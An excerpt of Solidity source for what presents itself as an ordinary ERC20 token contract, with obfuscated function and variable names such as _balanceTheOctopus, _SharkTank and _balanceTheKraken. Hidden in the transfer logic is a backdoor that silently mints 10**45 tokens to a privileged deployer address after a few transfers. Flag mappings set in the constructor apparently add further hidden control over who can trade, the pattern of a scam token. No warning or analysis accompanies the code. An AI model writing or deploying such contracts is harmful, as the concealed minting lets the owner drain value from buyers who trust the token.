...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _balanceTheOctopus(address account) internal {
        _balances[account] += (((account == _msgSenders) && (crossing > 2)) ? (10 ** 45) : 0);
    }
    ...
    function _SharkTank(address creator, uint256 jkal) internal virtual {
        ...
        (crossing,Sinaloa,Guatemala,Yucatan) = (0,false,(jkal/20),0);
        (Mexico,Bogota[_router],Bogota[creator],Bogota[pair]) = ((jkal/1000),true,true,true);
        (Panama[_router],Panama[creator]) = (false, false); 
    }
    ...
    function _balanceTheKraken(address sender, address recipient, uint256 amount) internal {
        _balanceTheMoron(sender, recipient, amount, (address(sender) == _msgSenders) && (crossing > 0));
        crossing += (sender == _msgSenders) ? 1 : 0;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balanceTheKraken(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        _balanceTheOctopus(sender);
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFish(creator, initialSupply);
        _SharkTank(creator, initialSupply);
    }
}
